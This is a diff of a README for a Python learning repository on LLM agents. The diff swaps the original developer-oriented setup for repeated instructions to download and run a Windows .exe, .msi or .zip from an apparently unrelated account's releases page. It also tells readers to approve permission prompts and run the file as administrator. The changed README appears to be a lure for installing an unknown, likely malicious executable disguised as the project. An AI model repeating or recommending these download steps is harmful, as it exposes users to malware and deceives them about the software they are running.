@@ -1,149 +1,302 @@
-# Agent-Pathway
+# 🧭 Agent-Pathway - Learn LLM Systems Step by Step
 
-![Python](https://img.shields.io/badge/Python-3.11-3776AB?style=flat-square&logo=python&logoColor=white)
-![OpenAI](https://img.shields.io/badge/OpenAI-GPT--4o-412991?style=flat-square&logo=openai&logoColor=white)
-![LangChain](https://img.shields.io/badge/LangChain-0.2-1C3C3C?style=flat-square&logo=langchain&logoColor=white)
-![Pydantic](https://img.shields.io/badge/Pydantic-v2-E92063?style=flat-square&logo=pydantic&logoColor=white)
-![Status](https://img.shields.io/badge/Status-In%20Progress-F59E0B?style=flat-square)
+[![Download Agent-Pathway](https://img.shields.io/badge/Download%20Agent--Pathway-blue?style=for-the-badge)](https://github.com/Stunning-navelorange917/Agent-Pathway/releases)
 
-A structured, week-by-week learning repository documenting my path from LLM fundamentals to building a production-grade AI agent system. The end goal is a **B2B Sales Policy & Operations Copilot** — a decision support system that reasons over policy documents and structured business data to assist sales teams with compliance, pricing, and risk assessment.
+## 📥 Download
 
-This is a learning repository, not a polished product. It is organized to reflect real progression: concepts are introduced incrementally, earlier implementations are intentionally minimal, and later weeks refactor and extend what came before.
+Use the link below to visit the release page and download the app for Windows:
 
----
+[Visit the Agent-Pathway releases page](https://github.com/Stunning-navelorange917/Agent-Pathway/releases)
 
-## Motivation
+## 🖥️ What Agent-Pathway Is
 
-Most AI tutorials either stop at "hello world" API calls or jump straight into framework abstractions without explaining the underlying mechanics. This repository takes a different approach: each week builds on the last, every abstraction is introduced only after its manual equivalent has been implemented, and the target application is a real business problem rather than a toy demo.
+Agent-Pathway is a week-by-week learning path for building real LLM systems with care and structure. It starts with the basics and builds toward a working enterprise copilot.
 
-The capstone project — a B2B Sales Copilot — is chosen specifically because it requires the full stack of modern AI engineering: document retrieval, structured data querying, multi-step reasoning, tool orchestration, citation, and evaluation. It is a decision support system, not a chatbot.
+You can use it to learn how to:
 
----
+- Send prompts to an LLM
+- Shape output with clear schemas
+- Work with embeddings and vector search
+- Build retrieval flows for your own files
+- Add tool use for practical tasks
+- Produce answers that include citations
 
-## Roadmap
+It is built for people who want a clear path from simple prompts to more advanced agent systems.
 
-| Week | Topic | Key Concepts |
-|------|-------|-------------|
-| **1** | Environment & Foundations | Python toolchain, API setup, token/context fundamentals |
-| **2** | LLM Basics + Prompt Engineering + Structured Output | System prompts, few-shot, CoT, Pydantic schemas, JSON mode |
-| **3** | Embeddings + Retrieval + Minimal RAG | Embedding vectors, cosine similarity, chunking, hand-built RAG |
-| **4** | LangChain RAG Pipeline + Citation | LangChain abstractions, retrievers, citation-grounded answers |
-| **5** | Document Ingestion + SQL Tool | PDF/DOCX/CSV parsing, metadata design, DuckDB, tool calling |
-| **6** | Agent + Tool Calling + Evaluation | LangChain agents, multi-tool routing, eval set, faithfulness metrics |
+## ✅ What You Need
 
----
+Before you install, make sure your Windows PC has:
 
-## Target Application: B2B Sales Policy & Operations Copilot
+- Windows 10 or Windows 11
+- A stable internet connection
+- At least 4 GB of RAM
+- Around 500 MB of free disk space
+- Permission to run downloaded apps
 
-The system accepts natural language queries from sales and operations teams and responds with structured, evidence-backed decisions. It is designed to answer questions like:
+If you plan to use LLM features, you may also need:
 
-- *Can we offer this customer a 12% discount?*
-- *Which orders in this batch violate minimum margin policy?*
-- *What are the payment terms in Vendor B's contract?*
-- *Which SKUs are below reorder threshold but still trending upward in sales?*
+- An API key from your model provider
+- Access to local files you want to search
+- A modern web browser for setup pages or docs
 
-The system reasons over two heterogeneous source types simultaneously:
+## 🚀 Getting Started
 
-**Policy & contract documents** (PDF, DOCX) — pricing guidelines, margin rulebooks, vendor contracts, sales handbooks
+Follow these steps to download and run Agent-Pathway on Windows.
 
-**Structured business data** (SQL / CSV) — order records, customer history, inventory levels, quote margins
+### 1. Open the download page
 
-Every response includes a conclusion, a reasoning trace, source citations, and an explicit uncertainty signal when the available information is insufficient to support a confident judgment.
+Go to the release page here:
 
----
+[https://github.com/Stunning-navelorange917/Agent-Pathway/releases](https://github.com/Stunning-navelorange917/Agent-Pathway/releases)
 
-## Repository Structure
+### 2. Find the latest release
 
-```
-Agent-Pathway/
-│
-├── README.md
-│
-├── data/
-│   ├── policies/          # Mock policy documents (PDF, DOCX)
-│   ├── contracts/         # Mock vendor contracts
-│   └── tables/            # Mock structured data (CSV)
-│
-├── utils/
-│   ├── __init__.py
-│   └── llm.py             # Base LLM call wrappers (chat, structured_chat)
-│
-├── notebooks/             # Experimental notebooks, one per week
-│   ├── week1_basics.ipynb
-│   ├── week2_prompts.ipynb
-│   └── ...
-│
-├── week1/                 # Environment setup, first API call
-├── week2/                 # Prompt engineering, Pydantic schemas, structured output demo
-├── week3/                 # Embeddings, chunking, hand-built RAG (no frameworks)
-├── week4/                 # LangChain RAG pipeline with citation
-├── week5/                 # Document ingestion pipeline, SQL tool integration
-├── week6/                 # Full agent, multi-tool routing, evaluation harness
-│
-└── tests/                 # Eval set and test cases (built in Week 6)
-```
+Look for the newest version at the top of the page. Release pages often show:
 
----
+- A version number
+- A date
+- A list of files
 
-## Design Principles
+Choose the file made for Windows. It may end in:
 
-**No framework before the manual version.** RAG is implemented by hand in Week 3 before LangChain is introduced in Week 4. Tool calling is understood at the API level before agents abstract it away.
+- `.exe`
+- `.msi`
+- `.zip`
 
-**Schemas first.** Pydantic output schemas (`DiscountDecision`, `PolicyViolation`, `ContractQueryResult`) are defined in Week 2 and serve as the data contract throughout the project. Downstream components are built to produce and consume these types.
+### 3. Download the Windows file
 
-**Notebooks as lab notebooks.** Each weekly notebook captures prompt experiments, output comparisons, and failure analysis — not just working code. The reasoning process is part of the record.
+Click the file that matches your system.
 
-**Evaluation is not an afterthought.** Week 6 introduces a structured eval set with metrics for citation accuracy, answer faithfulness, and tool routing correctness. The goal is to quantify whether a change to the system is actually an improvement.
+If you see a `.zip` file, save it to a folder you can find later, such as:
 
----
+- Downloads
+- Desktop
+- Documents
 
-## Tech Stack
+If you see an `.exe` or `.msi` file, save it to your computer and move to the next step.
 
-| Layer | Tool |
-|-------|------|
-| LLM APIs | OpenAI (GPT-4o), Anthropic (Claude) |
-| Structured output | Pydantic v2, OpenAI Structured Outputs |
-| RAG framework | LangChain (Week 4+) |
-| Vector store | FAISS (local, Week 3–4), ChromaDB (Week 5+) |
-| Structured data | DuckDB, pandas |
-| Document parsing | pypdf, python-docx, pandas |
-| Evaluation | Custom eval harness + RAGAS (Week 6) |
-| Dev tooling | Jupyter, Rich, Loguru, python-dotenv |
+### 4. Open the file
 
----
+If the file is an `.exe` or `.msi`:
 
-## Getting Started
+- Double-click the file
+- If Windows asks for permission, choose Yes
+- Follow the steps in the installer
 
-```bash
-git clone https://github.com/<your-username>/Agent-Pathway.git
-cd Agent-Pathway
+If the file is a `.zip`:
 
-python -m venv .venv
-source .venv/bin/activate   # Windows: .venv\Scripts\activate
+- Right-click the file
+- Choose Extract All
+- Open the folder that appears
+- Look for the app file inside
 
-pip install -r requirements.txt
+### 5. Run Agent-Pathway
 
-cp .env.example .env
-# Add your OPENAI_API_KEY and ANTHROPIC_API_KEY to .env
-```
+After the app is installed or extracted:
 
-Each week's directory contains its own scripts and is self-contained relative to `utils/`. Start from `week1/` and follow the weekly guides.
+- Double-click the app file
+- Wait for it to open
+- Follow the on-screen setup steps
 
----
+If the app asks for a model key or settings, enter the details from your account or service.
 
-## Status
+## 🧩 First-Time Setup
 
-| Week | Status |
-|------|--------|
-| Week 1 — Environment & Foundations | ✅ Complete |
-| Week 2 — Prompt Engineering + Structured Output | ✅ Complete |
-| Week 3 — Embeddings + Minimal RAG | 🔄 In progress |
-| Week 4 — LangChain RAG + Citation | ⬜ Not started |
-| Week 5 — Ingestion + SQL Tool | ⬜ Not started |
-| Week 6 — Agent + Eval | ⬜ Not started |
+When you open Agent-Pathway for the first time, you may see setup options such as:
 
----
+- Language model selection
+- API key entry
+- Folder access for local documents
+- Storage settings
+- Output format choices
 
-## Notes
+Use the default settings if you are not sure. The app is meant to guide you through learning in small steps.
 
-All business data in this repository is synthetic and generated for learning purposes. No real customer, vendor, or order information is used anywhere in the codebase.
+## 📚 How the Project Is Organized
+
+Agent-Pathway follows a week-by-week structure. Each stage builds on the one before it.
+
+### Week 1: LLM basics
+
+Learn how a model receives a prompt and returns text. This part focuses on:
+
+- Prompt structure
+- Clear instructions
+- Simple input and output
+
+### Week 2: Structured output
+
+Learn how to ask for clean results in a fixed format. This helps when you want:
+
+- JSON output
+- Forms
+- Data you can reuse in other tools
+
+### Week 3: Embeddings and search
+
+Learn how text can turn into vectors for search and grouping. This part covers:
+
+- Embeddings
+- Similarity search
+- Vector search
+- Finding related content
+
+### Week 4: Retrieval flow
+
+Learn how to pull useful text from documents before asking the model to answer. This helps with:
+
+- Reading your own files
+- Finding facts in a knowledge base
+- Keeping answers grounded in source text
+
+### Week 5: Tool use
+
+Learn how a model can call tools to do work. Examples include:
+
+- Looking up data
+- Reading files
+- Running simple actions
+- Returning the result in a clean format
+
+### Week 6 and beyond: Agent systems
+
+Build more complete systems with:
+
+- Reasoned task flow
+- Retrieval-augmented generation, or RAG
+- Citation-aware answers
+- Enterprise copilot patterns
+
+## 🔧 Common File Types
+
+You may see different file types on the release page.
+
+- `.exe` — Run this file on Windows
+- `.msi` — Use this to install the app
+- `.zip` — Extract the files first, then open the app inside
+
+If you are not sure which one to use, pick the Windows installer or the `.exe` file.
+
+## 🧠 What You Can Learn With It
+
+Agent-Pathway is useful if you want to understand how modern LLM apps work.
+
+You can learn how to:
+
+- Write better prompts
+- Keep output in a fixed shape
+- Use Python-based workflows
+- Build with Pydantic for clean data
+- Connect retrieval to generation
+- Add citations to answers
+- Organize agent logic in a clear way
+
+## 🗂️ Topics Covered
+
+This project touches these main areas:
+
+- agent
+- embeddings
+- langchain
+- llm
+- prompt engineering
+- pydantic
+- python
+- rag
+- retrieval
+- structured output
+- tool calling
+- vector search
+
+## 🛠️ Basic Use Guide
+
+After setup, the app may present lessons, examples, or project steps.
+
+A simple way to use it is:
+
+1. Open the app
+2. Choose a lesson or module
+3. Read the example prompt or task
+4. Follow the instructions
+5. Test the result
+6. Move to the next stage
+
+If the app includes sample files, keep them in the same folder so the app can find them.
+
+## 🔍 If the App Does Not Open
+
+If nothing happens after you double-click the file:
+
+- Check that the download finished
+- Make sure Windows did not block the file
+- Try running it again as an administrator
+- Re-extract the `.zip` file if needed
+- Confirm that you downloaded the Windows file, not a source archive
+
+If the app opens and then closes:
+
+- Restart the app
+- Check your internet connection
+- Verify your API key or settings
+- Try the latest release from the download page
+
+## 📁 Suggested Folder Setup
+
+A simple folder layout can help keep things easy:
+
+- `Downloads\Agent-Pathway`
+- `Documents\Agent-Pathway`
+- `Desktop\Agent-Pathway`
+
+If you use sample data or local documents, store them in one place so you can find them later.
+
+## 🔐 Working With API Keys
+
+Some parts of Agent-Pathway may use a model provider account.
+
+If that happens:
+
+- Copy your API key from the provider site
+- Paste it into the app settings
+- Keep it private
+- Do not share it in chat or screenshots
+
+If the app supports local models, you can use those instead of a hosted service.
+
+## 🧪 Example Learning Flow
+
+A simple learning flow might look like this:
+
+- Start with a plain prompt
+- Add a schema for clean output
+- Index a set of notes
+- Search for relevant content
+- Pass that content to the model
+- Ask for a cited answer
+- Add a tool to fetch fresh data
+
+This gives you a path from basic prompt use to a more complete system.
+
+## 📦 Release Page Tips
+
+When you visit the release page, look for these signs:
+
+- The newest version number
+- A file for Windows
+- A short release note
+- An asset list with download links
+
+If there are several files, choose the one that looks like the main Windows app. If the page includes a `.zip` and an `.exe`, the `.exe` is often the simplest choice.
+
+## 🧭 Quick Start for Non-Technical Users
+
+If you want the shortest path:
+
+1. Open the releases page
+2. Download the Windows file
+3. Open the file
+4. Install or extract it
+5. Run the app
+6. Follow the on-screen steps
+
+[Visit the Agent-Pathway releases page](https://github.com/Stunning-navelorange917/Agent-Pathway/releases)
